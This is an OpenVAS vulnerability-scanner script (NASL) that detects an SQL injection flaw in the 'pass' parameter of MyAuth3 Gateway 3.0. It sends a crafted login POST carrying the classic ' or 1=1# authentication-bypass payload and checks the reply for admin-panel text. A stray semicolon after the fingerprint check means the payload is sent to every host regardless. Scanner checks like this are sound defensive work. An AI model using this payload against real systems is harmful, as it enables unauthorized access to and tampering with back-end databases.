##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_myauth3_gateway_blind_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801980");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_bugtraq_id(49530);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://doie.net/?p=578");
  script_xref(name:"URL", value:"http://www.1337day.com/exploits/16858");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17805/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 1881);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"insight", value:"The flaw exists due to the error in 'index.php', which fails to
sufficiently sanitize user-supplied input via 'pass' parameter before using it
in SQL query.");
  script_tag(name:"solution", value:"Vendor has released a patch to fix the issue, please contact
the vendor for patch information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running MyAuth3 Gateway and is prone SQL injection
vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add,
modify or delete information in the back-end database.");
  script_tag(name:"affected", value:"MyAuth3 Gateway version 3.0");
  script_xref(name:"URL", value:"http://www.tmsoft.com.br/index.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

myaPort = get_http_port(default:1881);

rcvRes = http_get_cache(item:"/index.php", port:myaPort);

if(">MyAuth3 Gateway</" >< rcvRes);
{
  authVariables ="panel_cmd=auth&r=ok&user=pingpong&pass=%27+or+1%3D1%23";

  host = http_host_name( port:myaPort );

  sndReq = string("POST /index.php?console=panel HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:myaPort, data:sndReq);

  if("cotas" >< rcvRes && ">Alterar" >< rcvRes && "senha&" >< rcvRes){
    security_message(myaPort);
  }
}
